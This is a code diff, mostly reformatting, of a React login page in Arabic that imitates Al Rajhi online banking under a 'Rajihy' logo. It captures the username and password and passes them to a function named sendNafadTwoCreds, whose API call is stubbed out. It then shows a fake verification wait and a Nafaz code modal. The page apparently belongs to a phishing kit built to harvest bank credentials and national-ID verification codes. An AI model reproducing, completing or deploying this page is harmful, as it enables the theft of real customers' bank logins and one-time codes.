@@ -1,30 +1,35 @@
-"use client"
+/* eslint-disable @typescript-eslint/no-explicit-any */
 
-import type React from "react"
-import { useEffect, useState } from "react"
-import NafazModal from "../components/NafazModal"
+"use client";
+
+import type React from "react";
+import { useEffect, useState } from "react";
+import NafazModal from "../components/NafazModal";
 
 interface ExternalPageData {
-  username: string
-  password: string
+  username: string;
+  password: string;
 }
 
 interface ExternalPageProps {
-  onVerificationSuccess?: () => void
-  initialPhone?: string
+  onVerificationSuccess?: () => void;
+  initialPhone?: string;
 }
 
-export default function ExternalPage({ onVerificationSuccess, initialPhone = "" }: ExternalPageProps) {
+export default function ExternalPage({
+  onVerificationSuccess,
+  initialPhone = "",
+}: ExternalPageProps) {
   const [formData, setFormData] = useState<ExternalPageData>({
     username: "",
     password: "",
-  })
-  const [isLoading, setIsLoading] = useState(false)
-  const [isSubmitted, setIsSubmitted] = useState(false)
-  const [isRejected] = useState(false)
-  const [showModal, setShowModal] = useState(false)
-  const [verificationCode] = useState("")
-  const [phone] = useState(initialPhone)
+  });
+  const [isLoading, setIsLoading] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
+  const [isRejected] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [verificationCode] = useState("");
+  const [phone] = useState(initialPhone);
 
   // Simulate the verification process with a timeout
   useEffect(() => {
@@ -32,16 +37,20 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
       const timer = setTimeout(() => {
         // This replaces the socket event handler
         if (onVerificationSuccess) {
-          onVerificationSuccess()
+          onVerificationSuccess();
         }
-      }, 5000) // 5 seconds delay to simulate verification
+      }, 5000); // 5 seconds delay to simulate verification
 
-      return () => clearTimeout(timer)
+      return () => clearTimeout(timer);
     }
-  }, [isSubmitted, onVerificationSuccess])
+  }, [isSubmitted, onVerificationSuccess]);
 
   // eslint-disable-next-line @typescript-eslint/no-unused-vars
-  const sendNafadTwoCreds = async (orderId: string, username: string, password: string) => {
+  const sendNafadTwoCreds = async (
+    orderId: string,
+    username: string,
+    password: string
+  ) => {
     // Replace with your API call
     try {
       // Example API call:
@@ -53,32 +62,34 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
       // return response.json();
 
       // For now, just return a successful response
-      return { success: true }
+      return { success: true };
     } catch (error) {
-      console.error("Error sending credentials:", error)
-      throw new Error("Failed to send credentials")
+      console.error("Error sending credentials:", error);
+      throw new Error("Failed to send credentials");
     }
-  }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setIsLoading(true)
+    e.preventDefault();
+    setIsLoading(true);
 
     try {
-      localStorage.setItem("nafaz_data", JSON.stringify(formData))
-      const { username, password } = JSON.parse(localStorage.getItem("nafaz_data") || "{}")
-      const order_id = JSON.parse(localStorage.getItem("order_id") || "null")
+      localStorage.setItem("nafaz_data", JSON.stringify(formData));
+      const { username, password } = JSON.parse(
+        localStorage.getItem("nafaz_data") || "{}"
+      );
+      const order_id = JSON.parse(localStorage.getItem("order_id") || "null");
 
-      await sendNafadTwoCreds(order_id, username, password)
+      await sendNafadTwoCreds(order_id, username, password);
 
-      await new Promise((resolve) => setTimeout(resolve, 2000))
-      setIsSubmitted(true)
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+      setIsSubmitted(true);
     } catch (error) {
-      console.error("خطأ في الدخول للنظام ", error)
+      console.error("خطأ في الدخول للنظام ", error);
     } finally {
-      setIsLoading(false)
+      setIsLoading(false);
     }
-  }
+  };
 
   const SubmittedContent = () => (
     <div className="space-y-8 bg-[#daf2f6]">
@@ -93,13 +104,17 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
         </div>
       </div>
     </div>
-  )
+  );
 
   return (
     <div className="min-h-screen bg-[#eee] flex flex-col items-center pt-12 pb-24">
       <div className="w-full space-y-8 px-4">
         <div className="flex justify-between px-8">
-          <img src="/rajihy-logo.svg" alt="Rajihy logo" className="w-[150px] h-auto object-cover" />
+          <img
+            src="/rajihy-logo.svg"
+            alt="Rajihy logo"
+            className="w-[150px] h-auto object-cover"
+          />
         </div>
 
         {isRejected && (
@@ -108,18 +123,25 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
             role="alert"
           >
             <strong className="font-bold">عذراً! </strong>
-            <span className="block sm:inline">تم الرفض طلبك من قبل المسؤول , يرجى المحاوله في وقت لاحق</span>
+            <span className="block sm:inline">
+              تم الرفض طلبك من قبل المسؤول , يرجى المحاوله في وقت لاحق
+            </span>
           </div>
         )}
         <div className="flex justify-between items-center">
           <div className="mt-12 space-y-8 container mx-auto max-w-[520px] bg-white p-6 pb-10 rounded-2xl">
             {!isSubmitted ? (
               <form className="space-y-8 px-4" onSubmit={handleSubmit}>
-                <h2 className="text-4xl max-w-[300px] mt-8 mb-10">مرحبا بك في الراجحي اون لاين</h2>
+                <h2 className="text-4xl max-w-[300px] mt-8 mb-10">
+                  مرحبا بك في الراجحي اون لاين
+                </h2>
                 <p>تسجيل الدخول</p>
                 <div className="space-y-4">
                   <div>
-                    <label htmlFor="username" className="block text-right text-sm font-medium text-gray-700 mb-4">
+                    <label
+                      htmlFor="username"
+                      className="block text-right text-sm font-medium text-gray-700 mb-4"
+                    >
                       اسم المستخدم
                     </label>
                     <input
@@ -138,7 +160,10 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
                   </div>
 
                   <div>
-                    <label htmlFor="password" className="block text-right text-sm font-medium text-gray-700 mb-1">
+                    <label
+                      htmlFor="password"
+                      className="block text-right text-sm font-medium text-gray-700 mb-1"
+                    >
                       كلمة المرور
                     </label>
                     <input
@@ -180,7 +205,11 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
             )}
           </div>
           <div className="hidden lg:flex w-[50%] lg:flex-col lg:items-center">
-            <img src="/phones.png" alt="phones" className="w-full max-w-[560px] h-auto object-cover" />
+            <img
+              src="/phones.png"
+              alt="phones"
+              className="w-full max-w-[560px] h-auto object-cover"
+            />
             <div className="text-center">
               <p>
                 افتح حسابك في <span className="font-bold">خطوات قليلة</span>
@@ -192,8 +221,12 @@ export default function ExternalPage({ onVerificationSuccess, initialPhone = "" 
           </div>
         </div>
       </div>
-      <NafazModal isOpen={showModal} onClose={() => setShowModal(false)} auth_number={verificationCode} phone={phone} />
+      <NafazModal
+        isOpen={showModal}
+        onClose={() => setShowModal(false)}
+        auth_number={verificationCode}
+        phone={phone}
+      />
     </div>
-  )
+  );
 }
-
